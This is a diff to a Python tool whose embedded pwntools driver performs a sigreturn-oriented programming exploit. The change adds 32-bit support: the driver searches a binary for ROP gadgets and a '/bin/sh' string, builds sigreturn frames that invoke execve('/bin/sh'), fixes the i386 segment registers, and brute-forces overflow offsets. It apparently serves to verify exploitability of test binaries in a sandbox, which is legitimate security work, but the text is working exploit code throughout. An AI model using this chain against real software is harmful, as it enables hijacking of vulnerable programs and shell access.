@@ -16,31 +16,51 @@ from ._sandbox import run_driver
 
 _DRIVER = r'''
 import sys, time
-from pwn import ELF, ROP, SigreturnFrame, process, context, p64
+from pwn import ELF, ROP, SigreturnFrame, process, context, p64, p32
 name = sys.argv[1]
-context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
+context.binary = elf = ELF(name, checksec=False); context.log_level = "error"
+is32 = elf.bits == 32
+context.arch = "i386" if is32 else "amd64"
 rop = ROP(elf)
-pop_rax = rop.find_gadget(["pop rax", "ret"])
-sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
-if not pop_rax or not sc:
-    print("NOT_APPLICABLE (need pop rax; ret and a syscall gadget)"); sys.exit(1)
 # a "/bin/sh" in the binary (data) -- SROP needs the string at a known fixed address (no-PIE)
 binsh = next(elf.search(b"/bin/sh\x00"), None)
 if binsh is None:
     print("NOT_APPLICABLE (no '/bin/sh' string in the binary)"); sys.exit(1)
 MARK = b"BINORACLE_SROP_PWNED"
 
-def frame_bytes():
-    frame = SigreturnFrame()
-    frame.rax = 0x3b                 # execve
-    frame.rdi = binsh
-    frame.rsi = 0
-    frame.rdx = 0
-    frame.rip = sc.address           # the restored RIP runs execve('/bin/sh', 0, 0)
-    return bytes(frame)
-
-chain = p64(pop_rax.address) + p64(15) + p64(sc.address) + frame_bytes()  # RAX=15 (rt_sigreturn)
-for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 200]:
+if is32:
+    # x86-32: sigreturn is syscall 119 (0x77) via `int 0x80`; the restored frame runs execve
+    # (eax=11) with ebx=&binsh, triggered by the frame's eip = int 0x80 gate.
+    pop_ax = rop.find_gadget(["pop eax", "ret"])
+    sc = rop.find_gadget(["int 0x80"])
+    if not pop_ax or not sc:
+        print("NOT_APPLICABLE (need pop eax; ret and an int 0x80 gadget)"); sys.exit(1)
+    def frame_bytes():
+        frame = SigreturnFrame(kernel="i386")   # i386 frame requires the kernel arch explicitly
+        frame.eax = 0x0b; frame.ebx = binsh; frame.ecx = 0; frame.edx = 0
+        frame.eip = sc.address
+        # pwntools' i386 frame defaults to legacy LDT segments (cs=0x73, ss=0x7b, ds=0); modern
+        # Linux i386 uses cs=0x23, ss/ds/es=0x2b, gs=0x63 -- without these the restored int 0x80
+        # faults on instruction fetch (confirmed: exit(42) -> SIGSEGV vs exit 42 once fixed).
+        frame.cs = 0x23; frame.ss = 0x2b; frame.ds = 0x2b; frame.es = 0x2b; frame.gs = 0x63; frame.fs = 0
+        return bytes(frame)
+    chain = p32(pop_ax.address) + p32(0x77) + p32(sc.address) + frame_bytes()  # EAX=119 (sigreturn)
+    pop_rax = pop_ax                     # alias for the shared VERIFIED print below
+else:
+    pop_rax = rop.find_gadget(["pop rax", "ret"])
+    sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+    if not pop_rax or not sc:
+        print("NOT_APPLICABLE (need pop rax; ret and a syscall gadget)"); sys.exit(1)
+    def frame_bytes():
+        frame = SigreturnFrame()
+        frame.rax = 0x3b                 # execve
+        frame.rdi = binsh
+        frame.rsi = 0
+        frame.rdx = 0
+        frame.rip = sc.address           # the restored RIP runs execve('/bin/sh', 0, 0)
+        return bytes(frame)
+    chain = p64(pop_rax.address) + p64(15) + p64(sc.address) + frame_bytes()  # RAX=15 (rt_sigreturn)
+for off in [72, 76, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 200]:
     io = None
     try:
         io = process([name])
